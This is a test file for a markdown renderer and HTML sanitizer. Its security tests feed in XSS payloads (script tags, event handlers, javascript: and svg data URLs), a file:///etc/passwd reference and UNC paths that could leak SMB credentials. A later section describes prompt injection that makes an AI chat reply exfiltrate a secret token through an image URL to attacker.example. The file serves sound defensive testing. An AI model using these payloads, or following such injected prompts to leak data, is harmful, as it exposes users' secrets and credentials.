import { strict as assert } from "node:assert";
import { test } from "node:test";
import { dropComments, renderMarkdown, sanitizeHtml } from "../src/markdown";

// renderMarkdown output goes straight into innerHTML for READMEs, issue/PR
// bodies, release notes, gists and AI chat — i.e. fully untrusted input from any
// repo or user. The rendering cases below pin the "looks broken" bugs; the
// security cases pin the allowlist that makes raw-HTML passthrough safe.

// ── rendering: the cases that used to render broken ──────────────────────────

test("images render as <img> (badges no longer show a stray '!')", () => {
  const out = renderMarkdown("![build](https://img.shields.io/badge/build-passing.svg)");
  assert.match(out, /<img [^>]*src="https:\/\/img\.shields\.io\/badge\/build-passing\.svg"/);
  assert.match(out, /alt="build"/);
  assert.ok(!out.includes("!<a"), "leftover '!' before a link");
});

test("badge links nest an image inside the anchor", () => {
  const out = renderMarkdown("[![CI](https://ci.test/b.svg)](https://ci.test/run)");
  assert.match(out, /<a [^>]*href="https:\/\/ci\.test\/run"[^>]*>\s*<img [^>]*src="https:\/\/ci\.test\/b\.svg"/);
});

test("raw HTML blocks survive (the centered-header README opening)", () => {
  const out = renderMarkdown('<p align="center">\n  <img src="logo.png" width="120" />\n</p>');
  assert.match(out, /<p align="center">/);
  assert.match(out, /<img [^>]*src="logo\.png"[^>]*width="120"/);
  assert.ok(!out.includes("&lt;p"), "HTML was escaped instead of rendered");
});

test("inline HTML and character entities are preserved", () => {
  assert.match(renderMarkdown("Press <kbd>⌘</kbd> now"), /<kbd>⌘<\/kbd>/);
  assert.match(renderMarkdown("a&nbsp;b"), /a&nbsp;b/);
  // A stray, non-tag '<' stays inert text rather than eating the line.
  assert.match(renderMarkdown("2 < 3 and 5 > 4"), /2 &lt; 3/);
});

test("task lists render checkboxes, not literal brackets", () => {
  const out = renderMarkdown("- [x] shipped\n- [ ] pending");
  assert.match(out, /md-task-list/);
  assert.match(out, /md-task-done/);
  assert.ok(!out.includes("[x]") && !out.includes("[ ]"), "raw brackets leaked");
});

test("strikethrough, autolinks, and ~~~ fences", () => {
  assert.match(renderMarkdown("~~gone~~"), /<del>gone<\/del>/);
  assert.match(renderMarkdown("see https://gitstudio.dev now"), /<a [^>]*href="https:\/\/gitstudio\.dev"/);
  assert.match(renderMarkdown("<https://gitstudio.dev>"), /<a [^>]*href="https:\/\/gitstudio\.dev"/);
  assert.match(renderMarkdown("~~~js\nlet a = 1;\n~~~"), /<pre><code class="language-js">let a = 1;/);
});

test("setext headings and indented code blocks", () => {
  assert.match(renderMarkdown("Title\n====="), /<h1>Title<\/h1>/);
  assert.match(renderMarkdown("Sub\n---"), /<h2>Sub<\/h2>/);
  assert.match(renderMarkdown("    const x = 1;"), /<pre><code>const x = 1;/);
});

test("existing constructs still work (headings, lists, tables, quotes, code)", () => {
  assert.match(renderMarkdown("# Hi"), /<h1>Hi<\/h1>/);
  assert.match(renderMarkdown("- a\n- b"), /<ul><li>a<\/li><li>b<\/li><\/ul>/);
  assert.match(renderMarkdown("| a | b |\n|---|--:|\n| 1 | 2 |"), /<table class="md-table">/);
  assert.match(renderMarkdown("| a | b |\n|---|--:|\n| 1 | 2 |"), /class="md-right"/);
  assert.match(renderMarkdown("> quoted"), /<blockquote><p>quoted<\/p><\/blockquote>/);
  assert.match(renderMarkdown("`code`"), /<code>code<\/code>/);
  assert.match(renderMarkdown("**b** and *i*"), /<strong>b<\/strong> and <em>i<\/em>/);
  assert.match(renderMarkdown("---"), /<hr \/>/);
});

// ── regressions caught by adversarial review ────────────────────────────────

test("URLs with query strings survive intact (no &amp;amp; corruption)", () => {
  const out = renderMarkdown("[b](https://img.shields.io/x.svg?a=1&b=2&label=CI)");
  assert.match(out, /href="https:\/\/img\.shields\.io\/x\.svg\?a=1&amp;b=2&amp;label=CI"/);
  assert.ok(!out.includes("&amp;amp;"), "URL was double-escaped");
  // Same for image sources, which is where badges actually live.
  const img = renderMarkdown("![b](https://img.shields.io/x.svg?a=1&b=2)");
  assert.match(img, /src="https:\/\/img\.shields\.io\/x\.svg\?a=1&amp;b=2"/);
  assert.ok(!img.includes("&amp;amp;"));
});

test("sanitizeHtml is idempotent for URLs (it runs over its own output)", () => {
  const once = renderMarkdown("[b](https://x.test/a?p=1&q=2)");
  assert.equal(sanitizeHtml(once), once, "second sanitize pass changed the URL");
});

test("links and images with a title render (not raw markdown)", () => {
  const link = renderMarkdown('[docs](https://x.test "The docs")');
  assert.match(link, /<a [^>]*href="https:\/\/x\.test"[^>]*title="The docs"[^>]*>docs<\/a>/);
  assert.ok(!link.includes("]("), "link rendered as literal markdown");

  const img = renderMarkdown('![logo](logo.png "Our logo")');
  assert.match(img, /<img [^>]*src="logo\.png"[^>]*title="Our logo"/);
  assert.ok(!img.includes("!["), "image rendered as literal markdown");
  assert.ok(!/(^|[^!])!<a/.test(img), "stray '!' leaked");
});

test("inline code is inert — HTML inside backticks is shown, not run", () => {
  const out = renderMarkdown("use `<b>bold</b>` and `<script>alert(1)</script>` here");
  assert.match(out, /<code>&lt;b&gt;bold&lt;\/b&gt;<\/code>/);
  assert.match(out, /<code>&lt;script&gt;alert\(1\)&lt;\/script&gt;<\/code>/);
  // The literal text must survive — it must NOT be eaten by the sanitizer.
  assert.ok(!/<b>bold<\/b>/.test(out), "HTML in a code span rendered live");
  assert.ok(out.includes("alert(1)"), "code-span contents were deleted");
});

test("a loose list (blank lines between items) is ONE list, not one per item", () => {
  // The way every model writes a numbered answer. Split at the blanks it
  // rendered as three <ol>s, and the reader saw "1. 1. 1.".
  const out = renderMarkdown("1. **first** - one\n\n2. **second** - two\n\n3. third");
  assert.equal((out.match(/<ol>/g) ?? []).length, 1, out);
  assert.equal((out.match(/<li>/g) ?? []).length, 3, out);
  // Bullets too, and a blank line still ENDS the list when prose follows.
  const two = renderMarkdown("- a\n\n- b\n\nAfter.\n- c");
  assert.equal((two.match(/<ul>/g) ?? []).length, 2, two);
  assert.match(two, /<p>After\.<\/p>/);
});

test("a wrapped item continues on its indented next line", () => {
  const out = renderMarkdown("- a long item that\n  wraps here\n- next");
  assert.equal((out.match(/<li>/g) ?? []).length, 2, out);
  assert.match(out, /<li>a long item that wraps here<\/li>/);
  assert.ok(!out.includes("<p>wraps"), "the wrapped line fell out of the list");
});

test("setext rule does not swallow lists, quotes or HTML followed by ---", () => {
  // A list item followed by a horizontal rule stays a list + <hr>.
  const list = renderMarkdown("- item one\n---");
  assert.match(list, /<ul><li>item one<\/li><\/ul>/);
  assert.ok(!/<h2>/.test(list), "list item became a heading");

  const quote = renderMarkdown("> quoted\n---");
  assert.match(quote, /<blockquote>/);
  assert.ok(!/<h2>quoted/.test(quote));

  const html = renderMarkdown('<p align="center">hi</p>\n---');
  assert.match(html, /<p align="center">/);
  assert.ok(!/<h2>/.test(html));

  // Genuine setext headings still work.
  assert.match(renderMarkdown("Real Heading\n---"), /<h2>Real Heading<\/h2>/);
  assert.match(renderMarkdown("Real Title\n==="), /<h1>Real Title<\/h1>/);
});

test("code blocks never interpret their contents", () => {
  const out = renderMarkdown("```\n<script>alert(1)</script>\n```");
  assert.match(out, /&lt;script&gt;/);
  assert.ok(!/<script/i.test(out));
});

// ── security: the allowlist boundary ─────────────────────────────────────────

test("script tags are dropped with their contents", () => {
  for (const src of [
    "<script>alert(1)</script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<script src='https://evil.test/x.js'></script>",
    "text <script>steal()</script> more",
  ]) {
    const out = renderMarkdown(src);
    assert.ok(!/<script/i.test(out), `script survived: ${src}`);
    assert.ok(!out.includes("alert(1)"), `script body survived: ${src}`);
  }
});

test("event handlers and style attributes are stripped", () => {
  const out = renderMarkdown('<img src="x.png" onerror="alert(1)" onload=alert(2) style="position:fixed">');
  assert.ok(!/onerror/i.test(out), "onerror survived");
  assert.ok(!/onload/i.test(out), "onload survived");
  assert.ok(!/style=/i.test(out), "style survived");
  assert.match(out, /<img [^>]*src="x\.png"/, "the image itself should render");
});

test("javascript: and data: URLs are neutralized", () => {
  assert.match(renderMarkdown("[click](javascript:alert(1))"), /href="#"/);
  assert.match(renderMarkdown('<a href="JaVaScRiPt:alert(1)">x</a>'), /href="#"/);
  // control characters used to smuggle a scheme past a naive check
  assert.match(renderMarkdown('<a href="java\tscript:alert(1)">x</a>'), /href="#"/);
  assert.match(renderMarkdown("![x](javascript:alert(1))"), /src="#"/);
  // data:text/html is an XSS vector; data:image/svg can script — both refused.
  assert.match(renderMarkdown('<img src="data:text/html;base64,PHNjcmlwdD4=">'), /src="#"/);
  assert.match(renderMarkdown('<img src="data:image/svg+xml;base64,PHN2Zz4=">'), /src="#"/);
  // a legitimate raster data URI is allowed
  assert.match(renderMarkdown('<img src="data:image/png;base64,iVBORw0KGgo=">'), /src="data:image\/png/);
});

test("foreign-content and framing elements are dropped with contents", () => {
  for (const src of [
    "<svg><script>alert(1)</script></svg>",
    "<iframe src='https://evil.test'></iframe>",
    "<math><mtext><script>alert(1)</script></mtext></math>",
    "<object data='x'></object>",
    "<embed src='x'>",
    "<form><input name=x></form>",
    "<noscript><p>x</p></noscript>",
    "<template><script>alert(1)</script></template>",
    "<style>body{display:none}</style>",
  ]) {
    const out = renderMarkdown(src);
    assert.ok(!/<(svg|iframe|math|object|embed|form|input|noscript|template|style|script)\b/i.test(out),
      `foreign element survived: ${src} -> ${out}`);
    assert.ok(!out.includes("alert(1)"), `payload survived: ${src}`);
  }
});

test("unknown tags are dropped but their text is kept", () => {
  const out = renderMarkdown("<marquee>hello</marquee>");
  assert.ok(!/marquee/i.test(out));
  assert.match(out, /hello/);
});

test("links always get safe rel/target, even if the author sets otherwise", () => {
  const out = renderMarkdown('<a href="https://x.test" target="_self" rel="opener">x</a>');
  assert.match(out, /rel="noopener noreferrer nofollow"/);
  assert.match(out, /target="_blank"/);
  assert.ok(!/rel="opener"/.test(out));
});

test("comments, doctypes and CDATA are removed", () => {
  assert.equal(sanitizeHtml("<!-- <script>alert(1)</script> -->"), "");
  assert.ok(!sanitizeHtml("<!DOCTYPE html><p>x</p>").includes("DOCTYPE"));
  assert.ok(!sanitizeHtml("<![CDATA[<script>alert(1)</script>]]>").includes("alert"));
});

test("dropComments removes exactly what the old /<!--[\\s\\S]*?-->/g removed", () => {
  // The old regex as the oracle — walked with exec() and the text between the
  // matches kept, so the test itself is not a one-pass strip (which is what
  // CodeQL rightly flags); the output is identical to s.replace(re, "").
  const old = (s: string) => {
    const re = /<!--[\s\S]*?-->/g;
    let out = "";
    let at = 0;
    for (let m = re.exec(s); m; m = re.exec(s)) {
      out += s.slice(at, m.index);
      at = m.index + m[0].length;
    }
    return out + s.slice(at);
  };
  const cases = [
    "", "plain", "<!-- a -->", "x<!-- a -->y<!-- b -->z", "<!---->", "<!--->", "<!-->", "<!-- unclosed",
    "a --> b", "<!-- a --> --> b", "<!-- <!-- --> -->", "<!<!---->--", "<!--\n<p>x</p>\n-->",
  ];
  for (const c of cases) assert.equal(dropComments(c), old(c), JSON.stringify(c));
  // And over a pile of random strings from the characters that matter.
  let seed = 7;
  const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648;
  const alphabet = ["<", "!", "-", ">", "a", " "];
  for (let n = 0; n < 3000; n++) {
    let s = "";
    for (let i = Math.floor(rnd() * 24); i > 0; i--) s += alphabet[Math.floor(rnd() * alphabet.length)];
    assert.equal(dropComments(s), old(s), JSON.stringify(s));
  }
});

test("a comment that one removal would assemble is removed too", () => {
  // "<!<!---->--" is "<!--" once its inner comment goes — the loop takes it next.
  for (const body of ["<!<!---->-- <script>alert(1)</script> -->", "<<!---->!-- x -->", "<!-<!---->- y -->"]) {
    const out = sanitizeHtml(body);
    assert.ok(!out.includes("<!--") && !out.includes("<script"), `${body} -> ${out}`);
  }
});

test("comment stripping is linear on hostile input", () => {
  // 50k unclosed openers took the old regex ~2s (every "<!--" re-scanned to the end).
  const t = Date.now();
  assert.equal(dropComments("<!--".repeat(50_000)), "<!--".repeat(50_000));
  assert.equal(dropComments("<!-- ".repeat(25_000) + "-->".repeat(25_000)), "-->".repeat(24_999));
  dropComments("<!<!---->--".repeat(10_000));
  assert.ok(Date.now() - t < 200, `took ${Date.now() - t}ms`);
});

test("attribute values containing '>' cannot break out of the tag", () => {
  const out = sanitizeHtml('<a href="https://x.test/a>b" title="c>d">link</a>');
  assert.ok(!out.includes("<script"));
  assert.match(out, /<a [^>]*>link<\/a>/);
});

test("id attributes are dropped (no anchor hijacking)", () => {
  assert.ok(!/id=/.test(renderMarkdown('<div id="header">x</div>')));
});

test("pathological input stays bounded", () => {
  // deep quote nesting and deep list indentation must not blow the stack
  assert.doesNotThrow(() => renderMarkdown(">".repeat(200) + " deep"));
  assert.doesNotThrow(() => renderMarkdown(Array.from({ length: 60 }, (_, i) => " ".repeat(i * 2) + "- x").join("\n")));
  assert.doesNotThrow(() => renderMarkdown("a".repeat(200_000)));
});

test("empty and whitespace input render empty", () => {
  assert.equal(renderMarkdown(""), "");
  assert.equal(renderMarkdown("\n\n  \n").trim(), "");
});

// ── relative images, anchored by the surface ─────────────────────────────────
//
// "images dont load and appear broken everywhere, issues, prs, md files."
// Three breakages stacked: the CSP (fixed in index.html, pinned by a check),
// and relative srcs resolving against the app's own origin — these pin the
// resolver that fixes the third.

test("a relative image src is rewritten by the surface's resolver", () => {
  const html = renderMarkdown("![icon](brand/icon.svg)", 0, {
    resolveImage: (rel) => `https://raw.githubusercontent.com/o/r/HEAD/${rel}`,
  });
  assert.match(html, /src="https:\/\/raw\.githubusercontent\.com\/o\/r\/HEAD\/brand\/icon\.svg"/);
});

test("an absolute image src is NOT handed to the resolver", () => {
  const html = renderMarkdown("![badge](https://img.shields.io/badge.svg)", 0, {
    resolveImage: () => "https://wrong.example/x",
  });
  assert.match(html, /src="https:\/\/img\.shields\.io\/badge\.svg"/);
});

test("a raw <img> tag's relative src is resolved too — same document, same anchor", () => {
  const html = renderMarkdown('<img src="brand/icon.svg" width="116">', 0, {
    resolveImage: (rel) => `https://raw.example/${rel}`,
  });
  assert.match(html, /src="https:\/\/raw\.example\/brand\/icon\.svg"/);
});

test("a resolver may mint file: — only a resolver, never the document", () => {
  const resolved = renderMarkdown("![x](docs/a.png)", 0, {
    resolveImage: (rel) => `file:///repo/${rel}`,
  });
  assert.match(resolved, /src="file:\/\/\/repo\/docs\/a\.png"/);
  // The document writing file: itself still dies in the filter.
  const direct = renderMarkdown("![x](file:///etc/passwd)");
  assert.doesNotMatch(direct, /src="file:/);
});

test("a resolver that produces javascript: is neutered like any other source", () => {
  const html = renderMarkdown("![x](a.png)", 0, {
    resolveImage: () => "javascript:alert(1)",
  });
  assert.doesNotMatch(html, /javascript:/);
});

test("the resolver is cleared after the render, error or not", () => {
  renderMarkdown("![a](one.png)", 0, { resolveImage: (r) => `https://x.example/${r}` });
  // A second render WITHOUT a resolver must not inherit the first one's.
  const plain = renderMarkdown("![b](two.png)");
  assert.match(plain, /src="two\.png"/);
});

// ── text nobody vetted: no image from the web ────────────────────────────────
// A model's reply is rendered as Markdown, and a prompt hidden in what it read
// can make it write an image whose address carries that out. With
// remoteImages: false, no such address survives, in either spelling of an
// image, while data: images and ordinary links are untouched.

test("remoteImages: false loads no image from the web, whichever way it is written", () => {
  const opts = { remoteImages: false } as const;
  for (const md of [
    "![status](https://attacker.example/p?q=secret-token)",
    "![status](http://attacker.example/p?q=secret-token)",
    "![status](//attacker.example/p?q=secret-token)",
    '<img alt="status" src="https://attacker.example/p?q=secret-token">',
    "[![status](https://attacker.example/p?q=secret-token)](https://example.com/run)",
    "> quoted: ![status](https://attacker.example/p?q=secret-token)",
  ]) {
    const html = renderMarkdown(md, 0, opts);
    assert.doesNotMatch(html, /attacker\.example/, md);
    assert.match(html, /<img [^>]*src=""/, `${md}: an empty src, which requests nothing`);
    assert.match(html, /alt="status"/, `${md}: the alt text still says what it was`);
  }
  // A link is a click away, not a request: it stays.
  assert.match(renderMarkdown("[docs](https://example.com/docs)", 0, opts), /href="https:\/\/example\.com\/docs"/);
  // A data: image is already on the page.
  const px = "data:image/png;base64,iVBORw0KGgo=";
  assert.match(renderMarkdown(`![px](${px})`, 0, opts), /src="data:image\/png;base64,iVBORw0KGgo="/);
  // And a resolver's local file still shows.
  assert.match(renderMarkdown("![a](a.png)", 0, { ...opts, resolveImage: (r) => `file:///repo/${r}` }), /src="file:\/\/\/repo\/a\.png"/);
  // …but a resolver pointing at the web does not.
  assert.doesNotMatch(renderMarkdown("![a](a.png)", 0, { ...opts, resolveImage: (r) => `https://raw.example/${r}` }), /raw\.example/);
});

test("a network-path reference is https, never the page's own scheme", () => {
  // The desktop app's page is file:, where "//host/a.png" means
  // file://host/a.png: on Windows a UNC path, and an SMB connection offering
  // the host your credentials, from viewing a pull request.
  for (const [md, want] of [
    ["![x](//evil.example/share/a.png)", "https://evil.example/share/a.png"],
    ["![x](///evil.example/share/a.png)", "https://evil.example/share/a.png"],
    ["![x](\\\\evil.example\\share\\a.png)", "https://evil.example/share/a.png"],
    ["![x](/\\evil.example/share/a.png)", "https://evil.example/share/a.png"],
    ['<img alt="x" src="//evil.example/share/a.png">', "https://evil.example/share/a.png"],
    ['<img alt="x" src="\\\\evil.example\\share\\a.png">', "https://evil.example/share/a.png"],
    ["[a link](//evil.example/share)", "https://evil.example/share"],
  ] as const) {
    const html = renderMarkdown(md);
    assert.ok(html.includes(`"${want}"`), `${md} → ${html}`);
    assert.doesNotMatch(html, /(src|href)="(\/\/|\\\\|\/\\)/, md);
  }
  // A path of this page's own stays a path.
  assert.match(renderMarkdown("![x](img/a.png)"), /src="img\/a\.png"/);
  assert.match(renderMarkdown("![x](/img/a.png)"), /src="\/img\/a\.png"/);
});

test("remoteImages: false lasts one render: the next one loads web images as before", () => {
  renderMarkdown("![a](https://attacker.example/a.png)", 0, { remoteImages: false });
  assert.match(renderMarkdown("![b](https://img.shields.io/b.svg)"), /src="https:\/\/img\.shields\.io\/b\.svg"/);
});
